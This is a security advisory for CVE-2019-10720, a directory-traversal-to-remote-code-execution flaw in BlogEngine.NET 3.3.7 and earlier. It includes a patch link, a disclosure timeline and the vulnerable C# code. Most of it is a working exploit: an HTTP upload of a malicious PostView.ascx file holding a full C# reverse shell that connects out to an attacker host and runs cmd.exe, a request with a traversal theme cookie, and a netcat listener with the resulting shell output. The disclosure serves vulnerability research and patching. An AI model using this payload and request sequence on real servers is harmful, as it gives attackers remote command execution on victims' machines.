A remote code execution (RCE) attack, CVE-2019-10720, exists on BlogEngine.NET versions 3.3.7 and earlier.  A user with privileges to add/upload files could upload a malicious `PostView.ascx` file and exploit a directory traversal in the **theme** cookie to trigger the RCE.

## Vendor Patch

* <https://github.com/rxtur/BlogEngine.NET/releases/tag/v3.3.8.0>

## Timeline

* Identified: 30 Mar 2019
* Initial Developer Contact: 31 Mar 2019
* Issue Disclosed: 17 Jun 2019

## Description

The application will use the **theme** cookie if the **theme** parameter is not set:

~~~{command="BlogEngine.Core/BlogSettings.cs"}
413         public string Theme
414         {
415             get
416             {
417                 var context = HttpContext.Current;
418                 if (context != null)
419                 {
420                     var request = context.Request;
421                     if (request.QueryString["theme"] != null)
422                     {
423                         return request.QueryString["theme"];
424                     }
425
426                     var cookie = request.Cookies[this.ThemeCookieName];
427                     if (cookie != null)
428                     {
429                         return cookie.Value;
430                     }
~~~

The **theme** cookie is vulnerable to a directory traversal; the **theme** cookie can be set to a folder that contains a malicious `PostView.ascx`, such as `.../../App_Data/files`.  The malicious code contained in `PostView.ascx` will be executed.

## Exploit

<https://github.com/irbishop/CVEs/blob/master/2019-10720/exploit.py>

A malicious file can be uploaded using `File Manager` in the application, `/api/upload?action=file`, or `/api/upload?action=filemgr`. In the following example `/api/upload?action=file` is used to upload the malicious `PostView.ascx` file:

<pagebreak></pagebreak>

~~~
POST /api/upload?action=file HTTP/1.1
Host: $RHOST
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:52.0) Gecko/20100101 Firefox/52.0
Accept: text/plain
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Cookie: XXX
Connection: close
Upgrade-Insecure-Requests: 1
Content-Type: multipart/form-data; boundary=---------------------------12143974373743678091868871063
Content-Length: 2085

-----------------------------12143974373743678091868871063
Content-Disposition: form-data; filename="PostView.ascx"

<%@ Control Language="C#" AutoEventWireup="true" EnableViewState="false" Inherits="BlogEngine.Core.Web.Controls.PostViewBase" %>
<%@ Import Namespace="BlogEngine.Core" %>

<script runat="server">
	static System.IO.StreamWriter streamWriter;

    protected override void OnLoad(EventArgs e) {
        base.OnLoad(e);

		using(System.Net.Sockets.TcpClient client = new System.Net.Sockets.TcpClient("$LHOST", $LPORT)) {
			using(System.IO.Stream stream = client.GetStream()) {
				using(System.IO.StreamReader rdr = new System.IO.StreamReader(stream)) {
					streamWriter = new System.IO.StreamWriter(stream);

					StringBuilder strInput = new StringBuilder();

					System.Diagnostics.Process p = new System.Diagnostics.Process();
					p.StartInfo.FileName = "cmd.exe";
					p.StartInfo.CreateNoWindow = true;
					p.StartInfo.UseShellExecute = false;
					p.StartInfo.RedirectStandardOutput = true;
					p.StartInfo.RedirectStandardInput = true;
					p.StartInfo.RedirectStandardError = true;
					p.OutputDataReceived += new System.Diagnostics.DataReceivedEventHandler(CmdOutputDataHandler);
					p.Start();
					p.BeginOutputReadLine();

					while(true) {
						strInput.Append(rdr.ReadLine());
						p.StandardInput.WriteLine(strInput);
						strInput.Remove(0, strInput.Length);
					}
				}
			}
		}
    }

    private static void CmdOutputDataHandler(object sendingProcess, System.Diagnostics.DataReceivedEventArgs outLine) {
		StringBuilder strOutput = new StringBuilder();

       	if (!String.IsNullOrEmpty(outLine.Data)) {
       		try {
                	strOutput.Append(outLine.Data);
                    streamWriter.WriteLine(strOutput);
                    streamWriter.Flush();
			} catch (Exception err) { }
        }
    }
</script>
<asp:PlaceHolder ID="phContent" runat="server" EnableViewState="false"></asp:PlaceHolder>

-----------------------------12143974373743678091868871063--
~~~

Open a  netcat listener, `nc -nlvp $LPORT`, and browse the application with the **theme** cookie set as `../../App_Data/files/2019/06/`, no authentication required.  The Code Execution triggers and opens a reverse shell:

~~~
GET / HTTP/1.1
Host: $LHOST
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:52.0) Gecko/20100101 Firefox/52.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Cookie: theme=../../App_Data/files/2019/06;
Connection: close
Upgrade-Insecure-Requests: 1
~~~

~~~{command="nc -nlvp $LPORT"}
listening on [any] $LPORT ...
connect to [$LHOST] from (UNKNOWN) [$RHOST] 49822
Microsoft Windows [Version 6.1.7601]
Copyright (c) 2009 Microsoft Corporation.  All rights reserved.
ipconfig
C:\Windows\system32>ipconfig
Windows IP Configuration
Ethernet adapter Local Area Connection:
~~~
